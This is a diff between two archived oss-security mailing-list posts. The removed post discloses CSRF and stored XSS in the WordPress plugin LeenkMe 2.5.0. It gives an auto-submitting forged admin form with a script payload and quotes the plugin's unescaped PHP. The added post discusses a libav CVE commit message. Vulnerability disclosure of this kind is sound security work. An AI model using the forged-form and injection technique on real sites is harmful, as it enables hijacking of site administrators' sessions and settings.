@@ -1,126 +1,29 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/16/4
-Message-ID: <CAOmn9FQwgG8PfecdkDLnqD8cGWTg0TKXudGs6-4J1zkFwB4+Pw@mail.gmail.com>
-Date: Sat, 16 Apr 2016 13:55:38 +0530
-From: shravan kumar <cor3sm4sh3r@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/17/4
+Message-ID: <3200281.PYQmTlBBlq@arcadia>
+Date: Sat, 17 Sep 2016 12:50:41 +0200
+From: Agostino Sarubbo <ago@...too.org>
 To: oss-security@...ts.openwall.com
-Subject: CSRF and Stored XSS in a WORDPRESS Plugin LeenkMe version 2.5.0.
+Cc: cve-assign@...re.org
+Subject: Re: Re: libav: NULL pointer dereference in put_no_rnd_pixels8_xy2_mmx (rnd_template.c)
 Content-Type: text/plain; charset=utf-8
 
-Hello ,
+On Friday 16 September 2016 21:49:19 cve-assign@...re.org wrote:
+> >> mpegvideo_motion: Handle edge emulation even without unrestricted_mv
+> >> 
+> >> Fix out of bounds read.
+> >> 
+> >> libavcodec/mpegvideo_motion.c
+> 
+> Use CVE-2016-7424.
 
-I would like to disclose CSRF and stored XSS vulnerability in Wordpress
-plugin LeenkMe version 2.5.0.
+I would like to mention that the upstream git commit is wrong.
+This issue is a NULL pointer access and not an out-of-bounds
 
-The plugin can be found at https://wordpress.org/plugins/leenkme/
-
-In the page wp-content/plugins/leenkme/facebook.php
-
-XSS vulnerable Fields are :
-
-   - facebook_message
-   - facebook_linkname
-   - facebook_caption
-   - facebook_description
-   - default_image
-   - _wp_http_referer
-
-
-This CSRF is tested on latest wordpress installation 4.4.2 using firefox
-browser.
-
-The Code for CSRF.html is
-
-<html>
-  <body onload="document.forms['xss'].submit()" >
-    <form name="xss" action="
-http://127.0.0.1/wp/wp-admin/admin.php?page=leenkme_facebook" method="POST">
-      <input type="hidden" name="facebook_profile" value="on" />
-      <input type="hidden" name="fb_publish_wpnonce" value="" />
-      <input type="hidden" name="_wp_http_referer" value="XSS" />
-      <input type="hidden" name="facebook_message" value="XSS" />
-      <input type="hidden" name="facebook_linkname" value="XSS" />
-      <input type="hidden" name="facebook_caption" value="XSS" />
-      <input type="hidden" name="facebook_description" value="
-</textarea><script>prompt();</script>" />
-      <input type="hidden" name="default_image" value="XSS" />
-      <input type="hidden" name="message_preference" value="author" />
-      <input type="hidden" name="clude" value="in" />
-      <input type="hidden" name="publish_cats&#91;&#93;" value="0" />
-      <input type="hidden" name="update_facebook_settings"
-value="Save&#32;Settings" />
-      <input type="submit" value="Submit form" />
-    </form>
-  </body>
-</html>
-
-
-The vulnerable page is
-
-wp-content/plugins/leenkme/facebook.php
-
-The vulnerable code producing XSS is
-
-
-if ( !empty( $_REQUEST['facebook_message'] ) )
-$user_settings['facebook_message'] = $_REQUEST['facebook_message'];
-else
-$user_settings['facebook_message'] = '';
-if ( !empty( $_REQUEST['facebook_linkname'] ) )
-$user_settings['facebook_linkname'] = $_REQUEST['facebook_linkname'];
-else
-$user_settings['facebook_linkname'] = '';
-if ( !empty( $_REQUEST['facebook_caption'] ) )
-$user_settings['facebook_caption'] = $_REQUEST['facebook_caption'];
-else
-$user_settings['facebook_caption'] = '';
-if ( !empty( $_REQUEST['facebook_description'] ) )
-$user_settings['facebook_description'] = $_REQUEST['facebook_description'];
-
-
--------------------------
--------------------------
--------------------------
-snip
-------------------------
--------------------------
---------------------------
-
-<td><textarea name="facebook_message" style="width: 500px;"
-maxlength="400"><?php
-echo $user_settings['facebook_message']; ?></textarea></td>
-                            </tr>
-                            <tr>
-                             <td><?php _e( 'Default Link Name:', 'leenkme'
-); ?></td>
-                                <td><input name="facebook_linkname"
-type="text" style="width: 500px;" value="<?php echo
-$user_settings['facebook_linkname']; ?>"  maxlength="100"/></td>
-                            </tr>
-                            <tr>
-                             <td><?php _e( 'Default Caption:', 'leenkme' );
-?></td>
-                                <td><input name="facebook_caption"
-type="text" style="width: 500px;" value="<?php echo
-$user_settings['facebook_caption']; ?>" maxlength="100"/></td>
-                            </tr>
-                            <tr>
-                             <td style='vertical-align: top; padding-top:
-5px;'><?php _e( 'Default Description:', 'leenkme' ); ?></td>
-                                <td><textarea name="facebook_description"
-style="width: 500px;" maxlength="300"><?php echo
-$user_settings['facebook_description']; ?></textarea></td>
-
-
-The code used to protect against CSRF that is the anti csrf token used is
-
-<?php wp_nonce_field( 'fb_publish', 'fb_publish_wpnonce' ); ?>
-
-
-But this code is not protecting against the CSRF, the form get submitted
-successfully with out any error even though the fb_publish_wpnonce is kept
-empty resulting in CSRF vulnerability.
+I already pinged an upstream developer to notify the discrepancy but I guess 
+that their git does not allow to edit the message for the commit already 
+pushed.
 
 -- 
-Shravan Kumar
-
+Agostino Sarubbo
+Gentoo Linux Developer
